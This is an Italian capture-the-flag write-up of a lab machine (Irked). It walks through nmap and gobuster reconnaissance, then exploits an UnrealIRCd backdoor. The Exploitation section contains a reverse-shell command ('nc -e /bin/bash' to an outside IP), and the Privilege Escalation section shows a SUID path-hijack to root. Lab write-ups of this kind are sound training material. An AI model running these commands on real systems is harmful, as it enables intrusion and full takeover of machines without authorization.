# Drive

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.117
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.117 (10.10.10.117)
Host is up (0.051s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          44361/udp6  status
|   100024  1          49390/tcp6  status
|   100024  1          55995/tcp   status
|_  100024  1          58413/udp   status
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/20%OT=22%CT=1%CU=43653%PV=Y%DS=2%DC=I%G=Y%TM=653232
OS:71%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Provo ad eseguire una scansione completa:

```text
sudo nmap -sC -sV -O -p- -oA /usr/share/nmap/full 10.10.10.117
```

Il risultato è il seguente:

```text
Nmap scan report for 10.10.10.117 (10.10.10.117)
Host is up (0.047s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          44361/udp6  status
|   100024  1          49390/tcp6  status
|   100024  1          55995/tcp   status
|_  100024  1          58413/udp   status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
55995/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/20%OT=22%CT=1%CU=40792%PV=Y%DS=2%DC=I%G=Y%TM=653232
OS:F6%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Procedo con la fase susccessiva.

## Enumeration

Innanzitutto, visito la pagina http://10.10.10.117/:

<p align="center">
  <img src="/Immagini/Linux-Box/Irked/irked-1.png" />
</p>

La scritta "IRC is almost working!" mi suggerisce di provare ad ispezionare meglio le porte attive relative al protocollo IRC (Internet Relay Chat Protocol) trovate precedentemente.

Prima di farlo però, lancio il comando _gobuster_:

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://0.0.0.0/
```

Ottenendo il seguente risultato:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.117/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 313] [--> http://10.10.10.117/manual/]
/server-status        (Status: 403) [Size: 300]
```

Provo a visistare la pagina http://10.10.10.117/manual ma non trovo nulla di interessante.

Quindi ritorno al protocollo IRC e dopo alcune ricerche, trovo questo script nmap per verificare la presenza di vulnerabilità sulle porte 6697, 8067 & 65534:

```text
nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor 10.10.10.117
```

Ottengo il seguente risultato:

```text
Nmap scan report for irked.htb (10.10.10.117)
Host is up (0.048s latency).

PORT      STATE SERVICE
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
65534/tcp open  unknown
```

**Quindi la porta 8067 è vulnerabile!**

## Exploitation

Cerco di sfruttare la vulnerabilità _UnrealIRCd_ backdoor per generare una reverse shell sulla macchina _Irked_.

Quindi avvio un listener sulla porta 4444 e lancio il seguente comando:

```text
nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.12 4444"  10.10.10.117
```

<p align="center">
  <img src="/Immagini/Linux-Box/Irked/irked-3.png" />
</p>

**Sono dentro!**

Ottengo una shell migliore tramite il seguente comando:

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

Provo a localizzare il primo flag tramite il comando _find_, ma scopro che questo appartiene all'utente _djmardov_.

## Privilege Escalation

Trasferisco il file _linpeas.sh_ e lo eseguo.

Trovo qualcosa di interessante nella parte relativa ai file con il bit SUID settato.

<p align="center">
  <img src="/Immagini/Linux-Box/Irked/irked-4.png" />
</p>

Provo ad eseguire il file _/usr/bin/viewuser_ ottenendo il seguente risultato:

```text
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2023-10-20 08:49 (:0)
sh: 1: /tmp/listusers: not found
```

Sembra che provi ad eseguire il file _/tmp/listusers_ senza però avere successo.

Controllando nella cortella _/tmp_ scopro che non esiste questo file. Quindi provvedo alla creazione di questo inserendo il comando _bash_:

```text
echo "bash" > /tmp/listusers
chmod +x /tmp/listusers
```

**Eseguo viewuser e sono root!**

<p align="center">
  <img src="/Immagini/Linux-Box/Irked/irked-5.png" />
</p>
